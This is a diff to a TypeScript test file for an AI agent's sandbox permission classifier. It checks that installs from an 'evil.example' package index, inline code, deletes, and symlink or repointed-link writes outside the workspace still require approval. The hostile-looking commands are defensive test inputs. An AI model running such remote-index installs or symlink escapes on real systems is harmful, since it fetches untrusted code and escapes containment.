@@ -1,4 +1,4 @@
-import { mkdtempSync, rmSync } from 'node:fs';
+import { mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { classifyTier, type ClassifyContext, type SentinelAction } from '../../../src/core/permissions/classifier';
@@ -7,6 +7,7 @@ import {
   forUnattendedRun,
   type SentinelServices,
 } from '../../../src/core/permissions/context';
+import { verifyPreDispatch } from '../../../src/core/permissions/dispatch';
 import { createWebSearchTurnState } from '../../../src/core/permissions/webSearch';
 
 /** Services where the owner's "run code in the sandbox without asking" switch is on or off. */
@@ -87,6 +88,8 @@ describe('in-sandbox work with the switch on runs without a card', () => {
     ['npm install humanize', 'sandbox_package_install'],
     ['pip install humanize', 'sandbox_package_install'],
     ['pip install "humanize==4.9.0"', 'sandbox_package_install'],
+    ['python3 -m pip install humanize', 'sandbox_package_install'],
+    ['node demo.js', 'sandbox_command'],
   ])('%s runs without a card', (command, reason) =>
     withWorkspace(async workspace => {
       const decision = await classifyTier(
@@ -170,6 +173,30 @@ describe('actions that leave the sandbox still ask, with the switch on', () => {
     ['a pip install from a requirements file', 'exec', { command: 'pip install -r requirements.txt' }],
     ['an npm install from a git address', 'exec', { command: 'npm install git+https://example.com/pkg.git' }],
     ['an npm install with no package named', 'exec', { command: 'npm install' }],
+    ['inline Python code', 'exec', { command: 'python3 -c "print(1)"' }],
+    ['inline Node code', 'exec', { command: 'node -e "console.log(1)"' }],
+    ['inline Python code read from stdin', 'exec', { command: 'python3 -' }],
+    [
+      'a pip install from an index URL',
+      'exec',
+      { command: 'pip install --index-url https://evil.example/simple humanize' },
+    ],
+    [
+      'a pip install from an extra index URL',
+      'exec',
+      { command: 'pip3 install --extra-index-url https://evil.example/simple humanize' },
+    ],
+    [
+      'a python -m pip install from an index URL',
+      'exec',
+      { command: 'python3 -m pip install --index-url https://evil.example/simple humanize' },
+    ],
+    [
+      'a python -m pip install from a web address',
+      'exec',
+      { command: 'python3 -m pip install https://evil.example/pkg.tar.gz' },
+    ],
+    ['a python -m pip install from a path', 'exec', { command: 'python3 -m pip install ./vendor/pkg' }],
     ['a delete', 'exec', { command: 'rm -rf build' }],
     ['a model-supplied environment', 'exec', { command: 'python3 humanize_demo.py', env: { PYTHONPATH: '/tmp' } }],
     ['a write to .git', 'write_file', { path: '.git/config', content: 'x' }],
@@ -213,6 +240,19 @@ describe('actions that leave the sandbox still ask, with the switch on', () => {
 
 describe('offline mode refuses package installs before any card', () => {
   test(
+    'python -m pip install is refused with the same plain line',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command: 'python3 -m pip install humanize', cwd: workspace }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true, offline: true }), workspace }),
+      );
+      expect(decision.auto_deny).toBe('offline_mode');
+      expect(decision.card).toBeNull();
+      expect(decision.reason_detail).toBe('Installing packages needs downloads, which are off while offline.');
+    }),
+  );
+
+  test(
     'pip install is refused with one plain line',
     withWorkspace(async workspace => {
       const decision = await classifyTier(
@@ -235,5 +275,95 @@ describe('offline mode refuses package installs before any card', () => {
       expect(decision.auto_deny).toBe('offline_mode');
       expect(decision.card).toBeNull();
     }),
+  );
+});
+
+describe('a write through a symlink is checked where it lands', () => {
+  /** A file outside the workspace that a link inside the workspace can point at. */
+  function withOutside(run: (outside: string) => Promise<void>): () => Promise<void> {
+    return async () => {
+      const outside = mkdtempSync(join(tmpdir(), 'sandbox-outside-'));
+      try {
+        await run(outside);
+      } finally {
+        rmSync(outside, { recursive: true, force: true });
+      }
+    };
+  }
+
+  test(
+    'a link whose final component points outside the workspace asks',
+    withWorkspace(async workspace =>
+      withOutside(async outside => {
+        writeFileSync(join(outside, 'secret.txt'), 'kept');
+        symlinkSync(join(outside, 'secret.txt'), join(workspace, 'link.txt'));
+        const decision = await classifyTier(
+          action('write_file', { path: join(workspace, 'link.txt'), content: 'changed' }),
+          makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+        );
+        expect(decision.tier).toBe(3);
+        expect(decision.reason).toBe('write_outside_workspace');
+      })(),
+    ),
+  );
+
+  test(
+    'a dangling link that leads outside the workspace asks',
+    withWorkspace(async workspace =>
+      withOutside(async outside => {
+        symlinkSync(join(outside, 'not-yet.txt'), join(workspace, 'dangling.txt'));
+        const decision = await classifyTier(
+          action('write_file', { path: join(workspace, 'dangling.txt'), content: 'new' }),
+          makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+        );
+        expect(decision.tier).toBe(3);
+        expect(decision.reason).toBe('write_outside_workspace');
+      })(),
+    ),
+  );
+
+  test(
+    'a link that stays inside the workspace still runs without a card',
+    withWorkspace(async workspace => {
+      writeFileSync(join(workspace, 'target.txt'), 'kept');
+      symlinkSync(join(workspace, 'target.txt'), join(workspace, 'inside.txt'));
+      const decision = await classifyTier(
+        action('write_file', { path: join(workspace, 'inside.txt'), content: 'changed' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+      );
+      expect(decision.tier).toBe(1);
+      expect(decision.reason).toBe('sandbox_file_write');
+    }),
+  );
+
+  test(
+    'a silent write re-checks its containment at dispatch and fails when the link is repointed outside',
+    withWorkspace(async workspace =>
+      withOutside(async outside => {
+        const path = join(workspace, 'note.txt');
+        writeFileSync(path, 'first');
+        const ctx = makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace });
+        const params = { path, content: 'second' };
+        const decision = await classifyTier(action('write_file', params), ctx);
+        expect(decision.tier).toBe(1);
+
+        rmSync(path);
+        writeFileSync(join(outside, 'secret.txt'), 'kept');
+        symlinkSync(join(outside, 'secret.txt'), path);
+        const error = await verifyPreDispatch({
+          call: {
+            tool_name: 'write_file',
+            tool_type: 'truefoundry-system',
+            canonical_params: params,
+            tier: 1,
+            approval_token_id: null,
+            approval_binding: null,
+            shell_binding: null,
+          },
+          ctx: { ...ctx, offline: false },
+        });
+        expect(error).toBeDefined();
+      })(),
+    ),
   );
 });
